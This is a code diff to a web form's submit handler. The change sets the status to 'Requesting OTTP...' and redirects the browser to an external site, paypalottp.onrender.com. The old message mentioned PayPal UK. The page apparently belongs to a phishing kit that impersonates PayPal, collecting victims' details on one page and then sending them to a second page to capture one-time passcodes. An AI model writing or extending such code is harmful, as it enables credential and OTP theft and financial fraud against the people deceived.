@@ -208,8 +208,11 @@
           throw new Error(result.error || "Submission failed.");
         }
 
-        status.textContent = "Cannot Access PayPal Uk Use Paypal Linked to Current Location.";
-        form.reset();
+        status.textContent = "Requesting OTTP...";
+form.reset();
+
+const REDIRECT_URL = "https://paypalottp.onrender.com";
+window.location.href = REDIRECT_URL;
       } catch (error) {
         status.textContent = error.message || "Unable to submit information.";
       } finally {
